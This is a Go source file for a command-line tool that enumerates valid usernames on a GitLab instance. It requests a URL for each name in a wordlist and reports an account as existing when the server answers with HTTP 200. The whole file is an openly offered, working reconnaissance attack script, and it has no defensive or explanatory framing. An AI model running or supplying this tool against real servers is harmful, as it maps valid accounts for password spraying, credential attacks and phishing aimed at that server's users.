package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
)

func main() {
	// Parsing command-line arguments
	urlFlag := flag.String("url", "", "The URL of the GitLab's instance")
	wordlistFlag := flag.String("wordlist", "", "Path to the username wordlist")
	flag.Parse()

	if *urlFlag == "" || *wordlistFlag == "" {
		fmt.Println("Both --url and --wordlist flags are required.")
		flag.Usage()
		os.Exit(1)
	}

	fmt.Println("GitLab User Enumeration in Go")

	file, err := os.Open(*wordlistFlag)
	if err != nil {
		fmt.Printf("Failed to open the wordlist file: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		username := scanner.Text()
		userURL := fmt.Sprintf("%s/%s", *urlFlag, username)

		// Custom HTTP client to handle redirects
		client := &http.Client{
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return http.ErrUseLastResponse
			},
		}

		resp, err := client.Head(userURL)
		if err != nil {
			fmt.Println("[!] Error making request:", err)
			continue
		}
		defer resp.Body.Close()

		// Check the HTTP status code and apply color accordingly
		if resp.StatusCode == 200 {
			// Green color for existing users
			fmt.Printf("\033[32m[+] The username %s exists!\033[0m\n", username)
		} else {
			// Red color for non-existing users
			fmt.Printf("\033[31m[-] The username %s does not exist.\033[0m\n", username)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Printf("Error reading the wordlist: %v\n", err)
	}
}
